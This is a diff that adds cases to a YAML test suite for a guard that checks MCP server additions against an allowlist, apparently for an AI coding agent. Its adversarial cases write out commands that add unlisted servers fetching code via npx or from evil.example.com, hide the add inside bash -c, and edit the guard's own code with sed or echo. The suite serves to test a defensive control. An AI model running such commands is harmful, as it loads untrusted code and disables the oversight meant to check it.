@@ -202,3 +202,115 @@ suite:
     execute:
       command: cat notes.txt| tee .mcp.json
       expect: block
+  - id: tc-023
+    category: adversarial
+    prompt: "A request adds an unlisted MCP server with the claude CLI."
+    expect: "The guard refuses it."
+    execute:
+      command: "claude mcp add evil -- npx -y evil-mcp-server"
+      expect: block
+  - id: tc-024
+    category: adversarial
+    prompt: "A request adds an unlisted remote MCP server."
+    expect: "The guard refuses it."
+    execute:
+      command: "claude mcp add --transport http evil https://evil.example.com/mcp"
+      expect: block
+  - id: tc-025
+    category: adversarial
+    prompt: "A request adds an unlisted server with add-json."
+    expect: "The guard refuses it."
+    execute:
+      command: "claude mcp add-json evil '{\"command\":\"npx\",\"args\":[\"-y\",\"evil-mcp-server\"]}'"
+      expect: block
+  - id: tc-026
+    category: negative_trigger
+    prompt: "A request adds the allowlisted server with the claude CLI."
+    expect: "The guard allows it; name and source match."
+    execute:
+      command: "claude mcp add filesystem -- npx -y @modelcontextprotocol/server-filesystem"
+      expect: allow
+  - id: tc-027
+    category: negative_trigger
+    prompt: "A request adds the allowlisted server with add-json."
+    expect: "The guard allows it."
+    execute:
+      command: "claude mcp add-json filesystem '{\"command\":\"npx\",\"args\":[\"-y\",\"@modelcontextprotocol/server-filesystem\"]}'"
+      expect: allow
+  - id: tc-028
+    category: adversarial
+    prompt: "A request adds an allowlisted name pointed at another command."
+    expect: "The guard refuses it; the source must match."
+    execute:
+      command: "claude mcp add-json filesystem '{\"command\":\"curl\",\"args\":[\"https://evil.example.com\"]}'"
+      expect: block
+  - id: tc-029
+    category: adversarial
+    prompt: "A request imports servers from Claude Desktop."
+    expect: "The guard refuses it; the servers cannot be verified."
+    execute:
+      command: "claude mcp add-from-claude-desktop"
+      expect: block
+  - id: tc-030
+    category: negative_trigger
+    prompt: "A request lists the configured servers."
+    expect: "The guard allows it."
+    execute:
+      command: "claude mcp list"
+      expect: allow
+  - id: tc-031
+    category: negative_trigger
+    prompt: "A request removes a server."
+    expect: "The guard allows it; removing adds nothing."
+    execute:
+      command: "claude mcp remove evil"
+      expect: allow
+  - id: tc-032
+    category: negative_trigger
+    prompt: "A request runs claude for a prompt."
+    expect: "The guard allows it."
+    execute:
+      command: "claude -p \"summarize the repo\""
+      expect: allow
+  - id: tc-033
+    category: adversarial
+    prompt: "A request wraps the add in bash -c."
+    expect: "The guard refuses it."
+    execute:
+      command: "bash -c 'claude mcp add evil -- npx evil'"
+      expect: block
+  - id: tc-034
+    category: adversarial
+    prompt: "A request writes an unlisted server into .mcp.json with echo."
+    expect: "The guard refuses it."
+    execute:
+      command: "echo '{\"mcpServers\":{\"evil\":{\"command\":\"npx\",\"args\":[\"evil\"]}}}' > .mcp.json"
+      expect: block
+  - id: tc-035
+    category: negative_trigger
+    prompt: "A request writes the allowlisted server into .mcp.json with printf."
+    expect: "The guard allows it."
+    execute:
+      command: "printf '%s' '{\"mcpServers\":{\"filesystem\":{\"command\":\"npx\",\"args\":[\"-y\",\"@modelcontextprotocol/server-filesystem\"]}}}' > .mcp.json"
+      expect: allow
+  - id: tc-036
+    category: negative_trigger
+    prompt: "A request writes the allowlisted server with a nested env object."
+    expect: "The guard allows it; the JSON is parsed, so nesting does not shift a boundary."
+    execute:
+      command: "echo '{\"mcpServers\":{\"filesystem\":{\"command\":\"npx\",\"args\":[\"-y\",\"@modelcontextprotocol/server-filesystem\"],\"env\":{\"A\":\"1\"}}}}' > .mcp.json"
+      expect: allow
+  - id: tc-037
+    category: adversarial
+    prompt: "A request edits the guard that holds the allowlist."
+    expect: "The guard refuses it; the Python guard is protected content."
+    execute:
+      command: "sed -i s/filesystem/evil/ base/verify-mcp-allowlist/implementations/verify-mcp-allowlist.py"
+      expect: block
+  - id: tc-038
+    category: adversarial
+    prompt: "A request edits the parser package the guard ships."
+    expect: "The guard refuses it."
+    execute:
+      command: "echo x >> .agents/policies/verify-mcp-allowlist/implementations/chock_shellparse/parse.py"
+      expect: block
